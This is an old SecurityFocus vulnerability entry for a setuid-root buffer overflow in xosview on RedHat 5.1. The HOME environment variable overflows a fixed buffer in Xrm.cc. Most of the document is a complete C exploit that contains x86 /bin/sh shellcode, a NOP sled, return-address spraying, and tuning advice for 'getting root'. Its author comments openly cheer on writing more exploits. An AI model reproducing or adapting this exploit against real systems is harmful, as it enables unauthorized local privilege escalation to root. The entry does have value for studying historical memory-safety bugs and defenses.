source: http://www.securityfocus.com/bid/362/info


xosview is an X11 system monitoring application that ships with RedHat 5.1 installed setuid root. A buffer overflow vulnerability was found in Xrm.cc, the offending code listed below:

char userrfilename[1024];

strcpy(userrfilename, getenv("HOME"));

The userfilename can be overflowed and arbritrary code executed to gain root access locally. 

* xosview 1.5.1 buffer overrun exploit

* brought to you by Kossak (ldvg@rnl.ist.utl.pt)

*

* yep, this is a shameless rip from Aleph's tutorials, but it sure

* works... Lets keep those exploits coming!! :)

* Thanks to Chris Evans for posting the bug.

*/

/* NOTE!!! xosview needs an open X display for this to work, so remember

* to modify the source (line 62), with your ip.

* The offset and buffer size work with me fine, but you might need to

* change them.

*/

#include <stdlib.h>

#define DEFAULT_OFFSET 1150

#define DEFAULT_BUFFER_SIZE 3500

#define NOP 0x90

char shellcode[] =

"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"

"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"

"\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {

__asm__("movl %esp,%eax");

}

void main(int argc, char *argv[]) {

char *buff, *ptr;

long *addr_ptr, addr;

int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;

int i;

if (!(buff = malloc(bsize))) {

printf("Can't allocate memory.\n");

exit(0);

}

addr = get_sp() - offset;

printf("xosview exploit by Kossak\n");

printf("try changing the default values if you dont get root now.\n");

printf("Using address: 0x%x\n", addr);

ptr = buff;

addr_ptr = (long *) ptr;

for (i = 0; i < bsize; i+=4)

*(addr_ptr++) = addr;

for (i = 0; i < bsize/2; i++)

buff[i] = NOP;

ptr = buff + ((bsize/2) - (strlen(shellcode)/2));

for (i = 0; i < strlen(shellcode); i++)

*(ptr++) = shellcode[i];

buff[bsize - 1] = '\0';

setenv("HOME", buff, 1);

system("/usr/bin/X11/xosview -display 0:0"); /* your IP here */

}